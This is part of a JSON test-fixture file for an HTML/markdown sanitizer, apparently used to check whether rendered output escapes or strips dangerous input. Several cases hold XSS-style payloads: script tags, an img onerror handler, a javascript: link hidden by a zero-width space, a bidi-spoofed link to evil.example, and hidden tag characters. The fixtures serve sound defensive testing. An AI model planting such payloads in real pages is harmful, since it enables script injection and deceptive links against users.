+      "raw_html": "<p>[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[x</p>\n",
+      "source": "[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[x\n",
+      "visible": ""
+    },
+    {
+      "class": "table",
+      "core_html": "<table><thead><tr><th>h0</th><th>h1</th><th>h2</th><th>h3</th><th>h4</th><th>h5</th><th>h6</th><th>h7</th><th>h8</th><th>h9</th><th>h10</th><th>h11</th><th>h12</th><th>h13</th><th>h14</th><th>h15</th><th>h16</th><th>h17</th><th>h18</th><th>h19</th><th>h20</th><th>h21</th><th>h22</th><th>h23</th><th>h24</th><th>h25</th><th>h26</th><th>h27</th><th>h28</th><th>h29</th><th>h30</th><th>h31</th><th>h32</th><th>h33</th><th>h34</th><th>h35</th><th>h36</th><th>h37</th><th>h38</th><th>h39</th><th>h40</th><th>h41</th><th>h42</th><th>h43</th><th>h44</th><th>h45</th><th>h46</th><th>h47</th><th>h48</th><th>h49</th><th>h50</th><th>h51</th><th>h52</th><th>h53</th><th>h54</th><th>h55</th><th>h56</th><th>h57</th><th>h58</th><th>h59</th><th>h60</th><th>h61</th><th>h62</th><th>h63</th></tr></thead><tbody>\n<tr><td>r1c0</td><td>r1c1</td><td>r1c2</td><td>r1c3</td><td>r1c4</td><td>r1c5</td><td>r1c6</td><td>r1c7</td><td>r1c8</td><td>r1c9</td><td>r1c10</td><td>r1c11</td><td>r1c12</td><td>r1c13</td><td>r1c14</td><td>r1c15</td><td>r1c16</td><td>r1c17</td><td>r1c18</td><td>r1c19</td><td>r1c20</td><td>r1c21</td><td>r1c22</td><td>r1c23</td><td>r1c24</td><td>r1c25</td><td>r1c26</td><td>r1c27</td><td>r1c28</td><td>r1c29</td><td>r1c30</td><td>r1c31</td><td>r1c32</td><td>r1c33</td><td>r1c34</td><td>r1c35</td><td>r1c36</td><td>r1c37</td><td>r1c38</td><td>r1c39</td><td>r1c40</td><td>r1c41</td><td>r1c42</td><td>r1c43</td><td>r1c44</td><td>r1c45</td><td>r1c46</td><td>r1c47</td><td>r1c48</td><td>r1c49</td><td>r1c50</td><td>r1c51</td><td>r1c52</td><td>r1c53</td><td>r1c54</td><td>r1c55</td><td>r1c56</td><td>r1c57</td><td>r1c58</td><td>r1c59</td><td>r1c60</td><td>r1c61</td><td>r1c62</td><td>r1c63</td></tr>\n<tr><td>r2c0</td><td>r2c1</td><td>r2c2</td><td>r2c3</td><td>r2c4</td><td>r2c5</td><td>r2c6</td><td>r2c7</td><td>r2c8</td><td>r2c9</td><td>r2c10</td><td>r2c11</td><td>r2c12</td><td>r2c13</td><td>r2c14</td><td>r2c15</td><td>r2c16</td><td>r2c17</td><td>r2c18</td><td>r2c19</td><td>r2c20</td><td>r2c21</td><td>r2c22</td><td>r2c23</td><td>r2c24</td><td>r2c25</td><td>r2c26</td><td>r2c27</td><td>r2c28</td><td>r2c29</td><td>r2c30</td><td>r2c31</td><td>r2c32</td><td>r2c33</td><td>r2c34</td><td>r2c35</td><td>r2c36</td><td>r2c37</td><td>r2c38</td><td>r2c39</td><td>r2c40</td><td>r2c41</td><td>r2c42</td><td>r2c43</td><td>r2c44</td><td>r2c45</td><td>r2c46</td><td>r2c47</td><td>r2c48</td><td>r2c49</td><td>r2c50</td><td>r2c51</td><td>r2c52</td><td>r2c53</td><td>r2c54</td><td>r2c55</td><td>r2c56</td><td>r2c57</td><td>r2c58</td><td>r2c59</td><td>r2c60</td><td>r2c61</td><td>r2c62</td><td>r2c63</td></tr>\n<tr><td>r3c0</td><td>r3c1</td><td>r3c2</td><td>r3c3</td><td>r3c4</td><td>r3c5</td><td>r3c6</td><td>r3c7</td><td>r3c8</td><td>r3c9</td><td>r3c10</td><td>r3c11</td><td>r3c12</td><td>r3c13</td><td>r3c14</td><td>r3c15</td><td>r3c16</td><td>r3c17</td><td>r3c18</td><td>r3c19</td><td>r3c20</td><td>r3c21</td><td>r3c22</td><td>r3c23</td><td>r3c24</td><td>r3c25</td><td>r3c26</td><td>r3c27</td><td>r3c28</td><td>r3c29</td><td>r3c30</td><td>r3c31</td><td>r3c32</td><td>r3c33</td><td>r3c34</td><td>r3c35</td><td>r3c36</td><td>r3c37</td><td>r3c38</td><td>r3c39</td><td>r3c40</td><td>r3c41</td><td>r3c42</td><td>r3c43</td><td>r3c44</td><td>r3c45</td><td>r3c46</td><td>r3c47</td><td>r3c48</td><td>r3c49</td><td>r3c50</td><td>r3c51</td><td>r3c52</td><td>r3c53</td><td>r3c54</td><td>r3c55</td><td>r3c56</td><td>r3c57</td><td>r3c58</td><td>r3c59</td><td>r3c60</td><td>r3c61</td><td>r3c62</td><td>r3c63</td></tr>\n</tbody></table>\n",
+      "expect": "open",
+      "id": "wide-table-64",
+      "marker": "<table>",
+      "raw_html": "<table><thead><tr><th>h0</th><th>h1</th><th>h2</th><th>h3</th><th>h4</th><th>h5</th><th>h6</th><th>h7</th><th>h8</th><th>h9</th><th>h10</th><th>h11</th><th>h12</th><th>h13</th><th>h14</th><th>h15</th><th>h16</th><th>h17</th><th>h18</th><th>h19</th><th>h20</th><th>h21</th><th>h22</th><th>h23</th><th>h24</th><th>h25</th><th>h26</th><th>h27</th><th>h28</th><th>h29</th><th>h30</th><th>h31</th><th>h32</th><th>h33</th><th>h34</th><th>h35</th><th>h36</th><th>h37</th><th>h38</th><th>h39</th><th>h40</th><th>h41</th><th>h42</th><th>h43</th><th>h44</th><th>h45</th><th>h46</th><th>h47</th><th>h48</th><th>h49</th><th>h50</th><th>h51</th><th>h52</th><th>h53</th><th>h54</th><th>h55</th><th>h56</th><th>h57</th><th>h58</th><th>h59</th><th>h60</th><th>h61</th><th>h62</th><th>h63</th></tr></thead><tbody>\n<tr><td>r1c0</td><td>r1c1</td><td>r1c2</td><td>r1c3</td><td>r1c4</td><td>r1c5</td><td>r1c6</td><td>r1c7</td><td>r1c8</td><td>r1c9</td><td>r1c10</td><td>r1c11</td><td>r1c12</td><td>r1c13</td><td>r1c14</td><td>r1c15</td><td>r1c16</td><td>r1c17</td><td>r1c18</td><td>r1c19</td><td>r1c20</td><td>r1c21</td><td>r1c22</td><td>r1c23</td><td>r1c24</td><td>r1c25</td><td>r1c26</td><td>r1c27</td><td>r1c28</td><td>r1c29</td><td>r1c30</td><td>r1c31</td><td>r1c32</td><td>r1c33</td><td>r1c34</td><td>r1c35</td><td>r1c36</td><td>r1c37</td><td>r1c38</td><td>r1c39</td><td>r1c40</td><td>r1c41</td><td>r1c42</td><td>r1c43</td><td>r1c44</td><td>r1c45</td><td>r1c46</td><td>r1c47</td><td>r1c48</td><td>r1c49</td><td>r1c50</td><td>r1c51</td><td>r1c52</td><td>r1c53</td><td>r1c54</td><td>r1c55</td><td>r1c56</td><td>r1c57</td><td>r1c58</td><td>r1c59</td><td>r1c60</td><td>r1c61</td><td>r1c62</td><td>r1c63</td></tr>\n<tr><td>r2c0</td><td>r2c1</td><td>r2c2</td><td>r2c3</td><td>r2c4</td><td>r2c5</td><td>r2c6</td><td>r2c7</td><td>r2c8</td><td>r2c9</td><td>r2c10</td><td>r2c11</td><td>r2c12</td><td>r2c13</td><td>r2c14</td><td>r2c15</td><td>r2c16</td><td>r2c17</td><td>r2c18</td><td>r2c19</td><td>r2c20</td><td>r2c21</td><td>r2c22</td><td>r2c23</td><td>r2c24</td><td>r2c25</td><td>r2c26</td><td>r2c27</td><td>r2c28</td><td>r2c29</td><td>r2c30</td><td>r2c31</td><td>r2c32</td><td>r2c33</td><td>r2c34</td><td>r2c35</td><td>r2c36</td><td>r2c37</td><td>r2c38</td><td>r2c39</td><td>r2c40</td><td>r2c41</td><td>r2c42</td><td>r2c43</td><td>r2c44</td><td>r2c45</td><td>r2c46</td><td>r2c47</td><td>r2c48</td><td>r2c49</td><td>r2c50</td><td>r2c51</td><td>r2c52</td><td>r2c53</td><td>r2c54</td><td>r2c55</td><td>r2c56</td><td>r2c57</td><td>r2c58</td><td>r2c59</td><td>r2c60</td><td>r2c61</td><td>r2c62</td><td>r2c63</td></tr>\n<tr><td>r3c0</td><td>r3c1</td><td>r3c2</td><td>r3c3</td><td>r3c4</td><td>r3c5</td><td>r3c6</td><td>r3c7</td><td>r3c8</td><td>r3c9</td><td>r3c10</td><td>r3c11</td><td>r3c12</td><td>r3c13</td><td>r3c14</td><td>r3c15</td><td>r3c16</td><td>r3c17</td><td>r3c18</td><td>r3c19</td><td>r3c20</td><td>r3c21</td><td>r3c22</td><td>r3c23</td><td>r3c24</td><td>r3c25</td><td>r3c26</td><td>r3c27</td><td>r3c28</td><td>r3c29</td><td>r3c30</td><td>r3c31</td><td>r3c32</td><td>r3c33</td><td>r3c34</td><td>r3c35</td><td>r3c36</td><td>r3c37</td><td>r3c38</td><td>r3c39</td><td>r3c40</td><td>r3c41</td><td>r3c42</td><td>r3c43</td><td>r3c44</td><td>r3c45</td><td>r3c46</td><td>r3c47</td><td>r3c48</td><td>r3c49</td><td>r3c50</td><td>r3c51</td><td>r3c52</td><td>r3c53</td><td>r3c54</td><td>r3c55</td><td>r3c56</td><td>r3c57</td><td>r3c58</td><td>r3c59</td><td>r3c60</td><td>r3c61</td><td>r3c62</td><td>r3c63</td></tr>\n</tbody></table>\n",
+      "source": "| h0 | h1 | h2 | h3 | h4 | h5 | h6 | h7 | h8 | h9 | h10 | h11 | h12 | h13 | h14 | h15 | h16 | h17 | h18 | h19 | h20 | h21 | h22 | h23 | h24 | h25 | h26 | h27 | h28 | h29 | h30 | h31 | h32 | h33 | h34 | h35 | h36 | h37 | h38 | h39 | h40 | h41 | h42 | h43 | h44 | h45 | h46 | h47 | h48 | h49 | h50 | h51 | h52 | h53 | h54 | h55 | h56 | h57 | h58 | h59 | h60 | h61 | h62 | h63 |\n|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|\n| r1c0 | r1c1 | r1c2 | r1c3 | r1c4 | r1c5 | r1c6 | r1c7 | r1c8 | r1c9 | r1c10 | r1c11 | r1c12 | r1c13 | r1c14 | r1c15 | r1c16 | r1c17 | r1c18 | r1c19 | r1c20 | r1c21 | r1c22 | r1c23 | r1c24 | r1c25 | r1c26 | r1c27 | r1c28 | r1c29 | r1c30 | r1c31 | r1c32 | r1c33 | r1c34 | r1c35 | r1c36 | r1c37 | r1c38 | r1c39 | r1c40 | r1c41 | r1c42 | r1c43 | r1c44 | r1c45 | r1c46 | r1c47 | r1c48 | r1c49 | r1c50 | r1c51 | r1c52 | r1c53 | r1c54 | r1c55 | r1c56 | r1c57 | r1c58 | r1c59 | r1c60 | r1c61 | r1c62 | r1c63 |\n| r2c0 | r2c1 | r2c2 | r2c3 | r2c4 | r2c5 | r2c6 | r2c7 | r2c8 | r2c9 | r2c10 | r2c11 | r2c12 | r2c13 | r2c14 | r2c15 | r2c16 | r2c17 | r2c18 | r2c19 | r2c20 | r2c21 | r2c22 | r2c23 | r2c24 | r2c25 | r2c26 | r2c27 | r2c28 | r2c29 | r2c30 | r2c31 | r2c32 | r2c33 | r2c34 | r2c35 | r2c36 | r2c37 | r2c38 | r2c39 | r2c40 | r2c41 | r2c42 | r2c43 | r2c44 | r2c45 | r2c46 | r2c47 | r2c48 | r2c49 | r2c50 | r2c51 | r2c52 | r2c53 | r2c54 | r2c55 | r2c56 | r2c57 | r2c58 | r2c59 | r2c60 | r2c61 | r2c62 | r2c63 |\n| r3c0 | r3c1 | r3c2 | r3c3 | r3c4 | r3c5 | r3c6 | r3c7 | r3c8 | r3c9 | r3c10 | r3c11 | r3c12 | r3c13 | r3c14 | r3c15 | r3c16 | r3c17 | r3c18 | r3c19 | r3c20 | r3c21 | r3c22 | r3c23 | r3c24 | r3c25 | r3c26 | r3c27 | r3c28 | r3c29 | r3c30 | r3c31 | r3c32 | r3c33 | r3c34 | r3c35 | r3c36 | r3c37 | r3c38 | r3c39 | r3c40 | r3c41 | r3c42 | r3c43 | r3c44 | r3c45 | r3c46 | r3c47 | r3c48 | r3c49 | r3c50 | r3c51 | r3c52 | r3c53 | r3c54 | r3c55 | r3c56 | r3c57 | r3c58 | r3c59 | r3c60 | r3c61 | r3c62 | r3c63 |\n",
+      "visible": ""
+    },
+    {
+      "class": "table",
+      "core_html": "<table><thead><tr><th>a</th><th>b</th></tr></thead><tbody>\n<tr><td><code>x | y</code></td><td>z</td></tr>\n</tbody></table>\n",
+      "expect": "open",
+      "id": "table-pipes-in-code",
+      "marker": "<code>",
+      "raw_html": "<table><thead><tr><th>a</th><th>b</th></tr></thead><tbody>\n<tr><td><code>x | y</code></td><td>z</td></tr>\n</tbody></table>\n",
+      "source": "| a | b |\n|---|---|\n| `x \\| y` | z |\n",
+      "visible": ""
+    },
+    {
+      "class": "text",
+      "core_html": "<p>&lt;script&gt;window.__XSS = 1&lt;/script&gt;</p>\n",
+      "expect": "text",
+      "id": "entity-literal",
+      "marker": "&lt;script&gt;",
+      "raw_html": "<p>&lt;script&gt;window.__XSS = 1&lt;/script&gt;</p>\n",
+      "source": "&lt;script&gt;window.__XSS = 1&lt;/script&gt;\n",
+      "visible": "<script>window.__XSS = 1</script>"
+    },
+    {
+      "class": "text",
+      "core_html": "<pre><code class=\"language-html\">&lt;script&gt;window.__XSS = 1&lt;/script&gt;\n</code></pre>\n",
+      "expect": "text",
+      "id": "fence-html",
+      "marker": "&lt;script&gt;",
+      "raw_html": "<pre><code class=\"language-html\">&lt;script&gt;window.__XSS = 1&lt;/script&gt;\n</code></pre>\n",
+      "source": "```html\n<script>window.__XSS = 1</script>\n```\n",
+      "visible": "<script>window.__XSS = 1</script>"
+    },
+    {
+      "class": "text",
+      "core_html": "<p>Use <code>&lt;img src=x onerror=window.__XSS=1&gt;</code> as an example.</p>\n",
+      "expect": "text",
+      "id": "inline-code-html",
+      "marker": "&lt;img",
+      "raw_html": "<p>Use <code>&lt;img src=x onerror=window.__XSS=1&gt;</code> as an example.</p>\n",
+      "source": "Use `<img src=x onerror=window.__XSS=1>` as an example.\n",
+      "visible": "<img src=x onerror=window.__XSS=1>"
+    },
+    {
+      "class": "text",
+      "core_html": "<p><a href=\"https://evil.example/x\" rel=\"noopener noreferrer\">https://example.org/\u202efdp.exe</a></p>\n",
+      "expect": "open",
+      "id": "bidi-link-text",
+      "marker": "href=\"https://evil.example/x\"",
+      "raw_html": "<p><a href=\"https://evil.example/x\">https://example.org/\u202efdp.exe</a></p>\n",
+      "source": "[https://example.org/\u202efdp.exe](https://evil.example/x)\n",
+      "visible": ""
+    },
+    {
+      "class": "text",
+      "core_html": "<p>Hello \udb40\udc41\udb40\udc42\udb40\udc43 world \u200d end</p>\n",
+      "expect": "open",
+      "id": "tag-characters",
+      "marker": "world",
+      "raw_html": "<p>Hello \udb40\udc41\udb40\udc42\udb40\udc43 world \u200d end</p>\n",
+      "source": "Hello \udb40\udc41\udb40\udc42\udb40\udc43 world \u200d end\n",
+      "visible": ""
+    },
+    {
+      "class": "text",
+      "core_html": "<p><a href=\"java%E2%80%8Bscript:window.__XSS=1\" rel=\"noopener noreferrer\">click</a></p>\n",
+      "expect": "open",
+      "id": "zero-width-split",
+      "marker": "href=\"java",
+      "raw_html": "<p><a href=\"java%E2%80%8Bscript:window.__XSS=1\">click</a></p>\n",
+      "source": "[click](java\u200bscript:window.__XSS=1)\n",
+      "visible": ""
+    },
+    {
+      "class": "soup",
+      "core_html": "<p>text </p>",
+      "expect": "removed",
+      "id": "unclosed-script-at-end",
+      "marker": "<script",
+      "raw_html": "<p>text <script>window.__XSS = 1</p>\n",
+      "source": "text <script>window.__XSS = 1\n",
+      "visible": ""
+    },
+    {
+      "class": "soup",
+      "core_html": "<p>before &lt;img src=x onerror=window.__XSS=1 after</p>\n",
+      "expect": "text",
+      "id": "half-open-tag",
+      "marker": "&lt;img src=x",
+      "raw_html": "<p>before &lt;img src=x onerror=window.__XSS=1 after</p>\n",
+      "source": "before <img src=x onerror=window.__XSS=1 after\n",
+      "visible": "<img src=x onerror=window.__XSS=1 after"
+    },
+    {
+      "class": "soup",
+      "core_html": "",
+      "expect": "removed",
+      "id": "broken-comment",
+      "marker": "<script",
+      "raw_html": "<!-- hidden\n\n<script>window.__XSS = 1</script>\n\nafter\n",
+      "source": "<!-- hidden\n\n<script>window.__XSS = 1</script>\n\nafter\n",
+      "visible": ""
     }
   ],
   "elements": [
